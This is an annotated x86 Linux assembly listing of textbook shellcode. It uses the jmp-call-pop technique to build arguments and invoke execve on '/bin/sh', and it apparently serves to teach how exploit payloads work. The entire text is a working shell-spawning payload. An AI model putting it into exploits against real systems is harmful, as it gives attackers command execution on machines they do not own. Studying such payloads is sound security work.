jmp short    mycall               ; Immediately jump to the call instruction

shellcode:
    pop        esi                ; Store the address of "/bin/sh" in ESI
    xor        eax, eax           ; Zero out EAX
    mov byte   [esi + 7], al      ; Write the null byte at the end of the string

    mov dword  [esi + 8],  esi    ; [ESI+8], i.e. the memory immediately below the string
                                  ;   "/bin/sh", will contain the array pointed to by the
                                  ;   second argument of execve(2); therefore we store in
                                  ;   [ESI+8] the address of the string...
    mov dword  [esi + 12], eax    ; ...and in [ESI+12] the NULL pointer (EAX is 0)
    mov        al,  0xb           ; Store the number of the syscall (11) in EAX
    lea        ebx, [esi]         ; Copy the address of the string in EBX
    lea        ecx, [esi + 8]     ; Second argument to execve(2)
    lea        edx, [esi + 12]    ; Third argument to execve(2) (NULL pointer)
    int        0x80               ; Execute the system call

mycall:
    call       shellcode          ; Push the address of "/bin/sh" onto the stack
    db         "/bin/sh"
